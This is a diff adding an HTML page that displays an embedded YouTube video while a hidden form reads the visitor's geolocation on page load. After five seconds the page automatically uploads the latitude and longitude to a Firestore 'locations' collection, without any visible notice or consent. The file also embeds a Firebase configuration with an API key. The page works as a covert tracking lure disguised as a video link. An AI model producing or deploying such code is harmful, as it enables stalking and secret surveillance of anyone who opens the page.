@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+   <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Location Form</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+        }
+        form {
+            width: 300px;
+            text-align: center;
+            display: none;
+        }
+        iframe{
+          aspect-ratio: 16/9;
+        }
+    </style>
+</head>
+<body onload="loadPage()">
+  
+  
+  
+  
+  
+  <iframe width="100%" src="https://www.youtube.com/embed/tgbNymZ7vqY">
+</iframe>
+
+<form id="locationForm">
+    <label for="latitude">Latitude:</label>
+    <input type="text" id="latitude" name="latitude" required>
+
+    <label for="longitude">Longitude:</label>
+    <input type="text" id="longitude" name="longitude" required>
+    <button type="button" onclick="submitLocation()">Submit</button>
+</form>
+
+<script>
+    // Initialize Firebase with your credentials
+    const firebaseConfig = {
+        apiKey: "AIzaSyBIMU1mbGehF2Y3cOvSAp51nUjIc9XRT7M",
+        authDomain: "profilewings.firebaseapp.com",
+        projectId: "profilewings",
+        storageBucket: "profilewings.appspot.com",
+        messagingSenderId: "737949367885",
+        appId: "1:737949367885:web:a67c7ba0c7cdc2181ea604",
+        measurementId: "G-S1HJQY3HS6"
+    };
+    firebase.initializeApp(firebaseConfig);
+
+    const db = firebase.firestore();
+
+    function getCurrentLocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    document.getElementById('latitude').value = position.coords.latitude;
+                    document.getElementById('longitude').value = position.coords.longitude;
+                },
+                (error) => {
+                    console.error('Error getting location: ', error.message);
+                    alert('Error getting location. Please enter manually.');
+                }
+            );
+        } else {
+            alert('Geolocation is not supported by your browser. Please enter manually.');
+        }
+    }
+
+    function submitLocation() {
+        const latitude = document.getElementById('latitude').value;
+        const longitude = document.getElementById('longitude').value;
+
+        // Add the latitude and longitude to Firestore
+        db.collection('locations').add({
+            latitude: parseFloat(latitude),
+            longitude: parseFloat(longitude)
+        })
+        .then(() => {
+            alert('Location submitted successfully!');
+            // You can add further actions after successful submission
+        })
+        .catch((error) => {
+            console.error('Error adding document: ', error);
+        });
+    }
+
+    function loadPage() {
+        // Get location on page load
+        getCurrentLocation();
+
+        // Automatically submit the form after 5 seconds
+        setTimeout(() => {
+            submitLocation();
+        }, 5000);
+    }
+</script>
+
+</body>
+</html>
